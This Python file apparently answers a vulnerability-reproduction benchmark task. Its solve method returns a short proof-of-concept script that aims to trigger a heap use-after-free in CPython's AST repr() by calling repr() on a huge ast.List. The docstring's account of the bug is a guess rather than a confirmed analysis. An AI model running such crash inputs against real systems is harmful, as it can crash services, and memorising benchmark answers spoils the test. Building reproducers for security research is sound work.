import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in AST repr().
        
        The vulnerability typically exists in the implementation of ast_repr (in Python-ast.c),
        where constructing the string representation of a deeply nested structure or a large
        sequence triggers a buffer reallocation. If the implementation holds a raw pointer 
        to the buffer (or a part of it) while recursively processing children or iterating 
        and appending, the reallocation invalidates that pointer, leading to a Use-After-Free.
        
        We generate a Python script that creates an AST structure producing a very large repr() 
        output to force these reallocations.
        """
        
        # We construct a script that:
        # 1. Imports ast
        # 2. Creates a large Constant string (4KB)
        # 3. Creates an ast.List containing 10,000 references to this constant
        #    This will produce a repr string of roughly 40MB (10000 * 4KB),
        #    forcing multiple resizes of the underlying string buffer.
        # 4. Calls repr() on the list to trigger the vulnerable code path.
        
        poc_script = (
            "import ast\n"
            "# Create a large AST structure to force buffer reallocation in ast_repr\n"
            "c = ast.Constant(value='A' * 4096)\n"
            "# A list with many elements ensures the loop in ast_repr runs many times,\n"
            "# and the total size ensures reallocation happens during the loop.\n"
            "root = ast.List(elts=[c] * 10000, ctx=ast.Load())\n"
            "repr(root)\n"
        )
        
        return poc_script.encode('utf-8')
